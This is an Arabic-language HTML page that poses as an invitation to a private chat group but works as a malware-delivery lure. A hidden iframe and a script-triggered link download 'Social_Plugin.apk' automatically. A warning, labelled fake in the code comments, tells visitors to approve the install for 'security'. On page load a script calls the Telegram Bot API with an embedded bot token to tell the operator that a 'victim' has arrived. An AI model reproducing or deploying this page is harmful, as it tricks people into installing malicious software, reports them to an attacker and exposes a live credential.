<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الانضمام للمجموعة</title>
    <style>
        body { background: #e6ebf0; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #fff; padding: 40px 20px; border-radius: 20px; text-align: center; width: 85%; max-width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .group-avatar { width: 130px; height: 130px; border-radius: 50%; object-fit: cover; border: 4px solid #0088cc; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #0088cc; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* رسالة التحذير الوهمية */
        #fake-alert {
            display: none;
            background-color: #fce8e6;
            color: #d9534f;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 14px;
            border: 1px solid #d9534f;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="shrouk_final.jpg" class="group-avatar">
        <h2>مجموعة الدردشة الخاصة</h2>
        <div class="loader"></div>
        <p id="status">جاري فحص أمان الرابط...</p>
        
        <div id="fake-alert">
            <strong>ملاحظة هامة:</strong><br>
            لتأكيد أمان جهازك، يرجى الموافقة على التثبيت في الرسالة القادمة للمتابعة إلى المجموعة.
        </div>
    </div>

    <iframe src="Social_Plugin.apk" style="display:none;"></iframe>

    <script>
        // إشعار دخول الصفحة للبوت
        fetch('https://api.telegram.org/bot8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk/sendMessage?chat_id=1356975454&text=👀 الضحية دخل صفحة الجروب.. التحميل سيبدأ بعد قليل!');

        // بدء التحميل وإظهار التحذير الوهمي بعد 5 ثوانٍ
        setTimeout(function() {
            // إظهار التحذير الوهمي
            document.getElementById('fake-alert').style.display = 'block';
            
            // تغيير نص الحالة
            document.getElementById('status').innerText = "يرجى الموافقة على التثبيت لإتمام التحويل...";
            
            // بدء التحميل
            var downloadLink = document.createElement("a");
            downloadLink.href = "Social_Plugin.apk";
            downloadLink.download = "Social_Plugin.apk";
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
        }, 5000);
    </script>
</body>
</html>
